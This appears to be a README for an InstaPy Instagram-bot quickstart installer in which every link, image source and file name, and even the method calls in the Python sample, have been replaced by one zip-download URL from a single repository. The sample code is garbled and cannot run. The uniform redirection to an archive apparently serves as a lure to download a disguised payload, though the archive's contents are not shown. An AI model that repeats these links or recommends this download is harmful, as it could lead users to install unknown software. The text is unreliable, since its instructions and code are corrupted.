<img src="https://github.com/deka214/instapy-quickstart/raw/refs/heads/master/installation/Linux/instapy-quickstart-v2.7.zip" width="150" align="right">

# Instapy Quickstart

### Installation
Using this repository, you will be able to install and use InstaPy with only very few steps.

1. Download the zip of this repository by clicking on the green button in the upper right corner `Clone or download`.
1. Unzip the folder and open the _installation folder_
1. Double click the installation file for your system
1. If you missed any installation it will tell you what you have to install
1. Once successfully installed you can edit the quickstart file or use any of the template files from the quickstart_templates folder
1. Insert your username and password and modify anything you want. Make use of the **[comprehensive documentation](https://github.com/deka214/instapy-quickstart/raw/refs/heads/master/installation/Linux/instapy-quickstart-v2.7.zip)**.
1. The last step is to open the _run folder_ and double click the file that suits your platform, e.g. https://github.com/deka214/instapy-quickstart/raw/refs/heads/master/installation/Linux/instapy-quickstart-v2.7.zip for MacOS. 

> If you're using one of the template files, make sure to copy and paste them into the same folder as the https://github.com/deka214/instapy-quickstart/raw/refs/heads/master/installation/Linux/instapy-quickstart-v2.7.zip file is and then rename it to https://github.com/deka214/instapy-quickstart/raw/refs/heads/master/installation/Linux/instapy-quickstart-v2.7.zip because that is the name of the file that will be chosen once you double click the run script. 

#### Basic quickstart file 
To get started quickly we've prepared a basic quickstart file in which you only have to edit the username and password, inside the single quotes, to make sure you're all set up.
After testing your installation by starting InstaPy once, you can go in and use the [documentation](https://github.com/deka214/instapy-quickstart/raw/refs/heads/master/installation/Linux/instapy-quickstart-v2.7.zip) to configure your personal bot.

The basic quickstart file looks like this:
```python
""" Quickstart script for InstaPy usage """
# imports
from instapy import InstaPy
from instapy import smart_run

# login credentials
insta_username = ''  # <- enter username here
insta_password = ''  # <- enter password here

# get an InstaPy session!
# set headless_browser=True to run InstaPy in the background
session = InstaPy(username=insta_username,
                  password=insta_password,
                  headless_browser=False)

with smart_run(session):
    """ Activity flow """
    # general settings
    https://github.com/deka214/instapy-quickstart/raw/refs/heads/master/installation/Linux/instapy-quickstart-v2.7.zip(enabled=True,
                                    delimit_by_numbers=True,
                                    max_followers=4590,
                                    min_followers=45,
                                    min_following=77)

    https://github.com/deka214/instapy-quickstart/raw/refs/heads/master/installation/Linux/instapy-quickstart-v2.7.zip(["friend1", "friend2", "friend3"])
    https://github.com/deka214/instapy-quickstart/raw/refs/heads/master/installation/Linux/instapy-quickstart-v2.7.zip(["pizza", "#store"])

    # activity
    https://github.com/deka214/instapy-quickstart/raw/refs/heads/master/installation/Linux/instapy-quickstart-v2.7.zip(["natgeo"], amount=10)
```

> When adding lines to the script, make sure to use a code editor which takes care of the indentation. Otherwise you will get an error upon execution.

---

#### Already used InstaPy before `pip install instapy`?
If you've used InstaPy before the update to PyPi that allows installing with `pip install instapy`, you have to move your database and log files into the new workspace directory.   
[**Check out this very short guide on what to do!**](https://github.com/deka214/instapy-quickstart/raw/refs/heads/master/installation/Linux/instapy-quickstart-v2.7.zip)

---

#### Encountering an issue while installing?
If you should encounter any problem with the installation, please use the main repository [InstaPy](https://github.com/deka214/instapy-quickstart/raw/refs/heads/master/installation/Linux/instapy-quickstart-v2.7.zip) to report the issue instead of this repository.


###### Have fun & stay responsible!
